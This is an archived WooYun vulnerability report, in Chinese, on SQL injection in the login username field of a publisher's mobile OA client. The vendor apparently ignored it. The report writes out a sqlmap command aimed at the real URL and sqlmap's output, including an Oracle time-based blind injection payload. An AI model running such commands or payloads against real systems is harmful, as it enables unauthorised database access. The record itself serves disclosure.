wybug_title: 山西人民出版社手机客户端sql注入
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2014-07-09：	积极联系厂商并且等待厂商认领中，细节不对外公开									2014-08-23：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 注入～ 详细说明：  ＃手机客户端地址
http://oa.sxpmg.com/defaultroot/sp/login.jsp
注入过程，用户名处存在注入
python sqlmap.py -u"http://oa.sxpmg.com//defaultroot/sp/desktop.jsp?isLogin=1" --data "userName=admin&userPassword=11" -p"userName"    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 02:15:24[02:15:24] [INFO] resuming back-end DBMS 'oracle' [02:15:24] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: userName    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: userName=admin' AND 3910=DBMS_PIPE.RECEIVE_MESSAGE(CHR(74)||CHR(80)||CHR(79)||CHR(99),5) AND 'Xcds'='Xcds&userPassword=11---[02:15:24] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle[02:15:24] [INFO] fetched data logged to text files under '/Users/xz.sqlmap/output/oa.sxpmg.com'[*] shutting down at 02:15:24


   漏洞证明：  如上   修复方案：  修复注入   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
